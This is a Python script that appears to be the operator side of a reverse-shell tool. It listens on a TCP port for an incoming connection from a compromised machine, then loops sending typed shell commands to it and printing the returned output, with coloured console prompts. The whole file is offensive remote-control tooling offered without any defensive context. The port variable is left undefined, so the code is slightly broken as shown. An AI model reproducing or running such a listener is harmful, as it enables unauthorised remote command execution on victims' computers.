import socket, os
from colorama import Fore, init
init()


os.system ("cls")

print(Fore.LIGHTYELLOW_EX + "\n [~] Target IP:" + Fore.WHITE)
try:
    ip = input(" >>> ")
except:
    print (Fore.LIGHTRED_EX + "\n Input Error")
    exit()

sckt = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sckt.setsockopt (socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sckt.bind ((ip, PORT))
sckt.listen()
c, address = sckt.accept()
c.settimeout (3)

print(Fore.LIGHTYELLOW_EX + "\n Connecting...")

while True:
    print(Fore.LIGHTYELLOW_EX + "\n [~] Command:" + Fore.WHITE)
    try:
        command = input(" >>> ")
    except:
        print (Fore.LIGHTRED_EX + "\n Input Error")
        exit()

    if command == "exit" :
        c.send (b"exit")
        sckt.close()
        break

    c.send (command.encode())

    try:
        result = c.recv (1024)
        print (Fore.LIGHTYELLOW_EX + "\n [+] Result:" + Fore.LIGHTGREEN_EX)
        print (result.decode())
    except:
        print (Fore.LIGHTRED_EX + "\n [-] Result Error")


print(Fore.LIGHTYELLOW_EX + "\n [~] Finish")
